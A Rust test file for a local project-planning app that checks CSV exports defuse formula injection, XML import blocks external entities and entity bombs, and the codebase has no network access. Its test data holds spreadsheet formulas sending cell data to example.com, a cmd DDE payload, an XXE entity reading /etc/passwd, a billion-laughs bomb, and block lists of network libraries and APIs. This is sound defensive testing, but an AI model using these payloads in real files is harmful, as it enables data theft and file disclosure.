//! What's typed into ProjectFCG stays on the computer: no part of the app
//! talks to the network, the web page is forbidden to, exported CSV files
//! can't turn a name into a formula that sends the sheet somewhere, and
//! imported XML can't pull in other files or blow up.
use chrono::NaiveDate;
use projectfcg::io::{csv_safe, csv_unsafe};
use projectfcg::model::Project;

#[test]
fn csv_cells_are_never_live_formulas() {
    for (cell, out) in [
        ("=1+1", "'=1+1"),
        ("=WEBSERVICE(\"https://example.com/?\"&A2)", "'=WEBSERVICE(\"https://example.com/?\"&A2)"),
        ("+cmd|'/c calc'!A0", "'+cmd|'/c calc'!A0"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("- fix the login", "'- fix the login"),
        ("\tTab", "'\tTab"),
        // numbers and ordinary text are left alone
        ("-5", "-5"),
        ("+3.5", "+3.5"),
        ("Design review", "Design review"),
        ("", ""),
    ] {
        assert_eq!(csv_safe(cell), out, "{cell:?}");
        assert_eq!(csv_unsafe(out), cell, "{out:?} back");
    }
    // an apostrophe that wasn't put there stays
    assert_eq!(csv_unsafe("'quoted'"), "'quoted'");
}

fn with_hostile_names() -> Project {
    let mut p = Project::new(NaiveDate::from_ymd_opt(2026, 1, 5).unwrap());
    p.append_task("=HYPERLINK(\"https://example.com/?\"&B2,\"Click\")");
    p.append_task("Normal task");
    projectfcg::schedule::schedule(&mut p);
    p
}

#[test]
fn every_csv_export_is_protected() {
    let mut p = with_hostile_names();
    let csv = projectfcg::io::to_csv(&p);
    assert!(csv.contains("'=HYPERLINK"), "{csv}");
    assert!(!csv.lines().any(|l| l.split(',').any(|c| c.trim_start_matches('"').starts_with('='))), "{csv}");
    // risks
    p.add_risk(projectfcg::risks::Risk { title: "=WEBSERVICE(\"https://example.com\")".into(), ..Default::default() });
    let r = p.risks_csv();
    assert!(r.contains("'=WEBSERVICE") && !r.contains(",=WEBSERVICE") && !r.contains(",\"=WEBSERVICE"), "{r}");
    // Jira: protected out, and read back as it was
    p.add_ticket("@SUM(1,2)", None).unwrap();
    let j = projectfcg::jira::export_csv(&p);
    assert!(j.contains("'@SUM"), "{j}");
    let mut q = Project::new(NaiveDate::from_ymd_opt(2026, 1, 5).unwrap());
    projectfcg::jira::import_csv(&mut q, &j, &projectfcg::jira::ImportOptions { create_sprints: true, create_people: true }).unwrap();
    assert!(q.tickets.iter().any(|t| t.title == "@SUM(1,2)"), "{:?}", q.tickets.iter().map(|t| &t.title).collect::<Vec<_>>());
}

#[test]
fn imported_xml_cannot_reach_other_files_or_explode() {
    // an external entity: never read
    let xxe = r#"<?xml version="1.0"?>
<!DOCTYPE Project [ <!ENTITY secret SYSTEM "file:///etc/passwd"> ]>
<Project xmlns="http://schemas.microsoft.com/project"><Name>&secret;</Name><Tasks><Task><UID>1</UID><ID>1</ID><Name>&secret;</Name></Task></Tasks></Project>"#;
    if let Ok((p, _)) = projectfcg::mspdi::from_xml(xxe) {
        assert!(p.tasks.iter().all(|t| !t.name.contains("root:")), "an external entity was read");
        assert!(!p.title.contains("root:"));
    }
    // "billion laughs": refused, quickly, without the memory
    let mut bomb = String::from("<?xml version=\"1.0\"?>\n<!DOCTYPE Project [\n <!ENTITY a0 \"lol\">\n");
    for k in 1..=12 {
        let prev = format!("&a{};", k - 1);
        bomb += &format!(" <!ENTITY a{k} \"{}\">\n", prev.repeat(10));
    }
    bomb += "]>\n<Project xmlns=\"http://schemas.microsoft.com/project\"><Tasks><Task><UID>1</UID><ID>1</ID><Name>&a12;</Name></Task></Tasks></Project>";
    let t = std::time::Instant::now();
    let r = projectfcg::mspdi::from_xml(&bomb);
    assert!(t.elapsed() < std::time::Duration::from_secs(2), "took {:?}", t.elapsed());
    if let Ok((p, _)) = r {
        assert!(p.tasks.iter().all(|t| t.name.len() < 1_000_000));
    }
}

/// A guard: the app has no way to reach the network. If this fails,
/// something that can (a dependency, a call) was added: it needs a
/// decision in docs/DECISIONS.md, not a quiet change here.
#[test]
fn nothing_in_the_app_can_reach_the_network() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    // no HTTP or socket library among the dependencies
    let lock = std::fs::read_to_string(root.join("Cargo.lock")).unwrap();
    for name in ["reqwest", "hyper", "ureq", "curl", "isahc", "surf", "attohttpc", "native-tls", "openssl", "rustls", "tungstenite", "webbrowser", "open"] {
        assert!(!lock.contains(&format!("\nname = \"{name}\"\n")), "{name} is a dependency");
    }
    // no sockets or URL fetching in the source
    let mut stack = vec![root.join("src")];
    while let Some(d) = stack.pop() {
        for e in std::fs::read_dir(d).unwrap() {
            let p = e.unwrap().path();
            if p.is_dir() {
                stack.push(p);
            } else if p.extension().is_some_and(|x| x == "rs") {
                let s = std::fs::read_to_string(&p).unwrap();
                for bad in ["std::net", "TcpStream", "UdpSocket", "open_url", "OpenUrl", "web_sys::Request", "XmlHttpRequest", "WebSocket"] {
                    assert!(!s.contains(bad), "{} uses {bad}", p.display());
                }
            }
        }
    }
    // the browser side: no network calls, and a policy forbidding them
    let js = std::fs::read_to_string(root.join("web/pfcg.js")).unwrap();
    for bad in ["fetch(", "XMLHttpRequest", "WebSocket", "sendBeacon", "EventSource", "importScripts", "http://", "https://"] {
        assert!(!js.contains(bad), "web/pfcg.js uses {bad}");
    }
    let bundle = std::fs::read_to_string(root.join("web/bundle.py")).unwrap();
    for rule in ["\"default-src 'none'\"", "\"connect-src 'none'\"", "\"form-action 'none'\"", "\"frame-src 'none'\"", "\"worker-src 'none'\"", "\"font-src 'none'\""] {
        assert!(bundle.contains(rule), "the page's policy lost {rule}");
    }
    let template = std::fs::read_to_string(root.join("web/template.html")).unwrap();
    assert!(template.contains("{{CSP}}"), "the page has no policy");
    assert!(!template.contains("src=\"http") && !template.contains("href=\"http"), "the page loads something from the web");
}
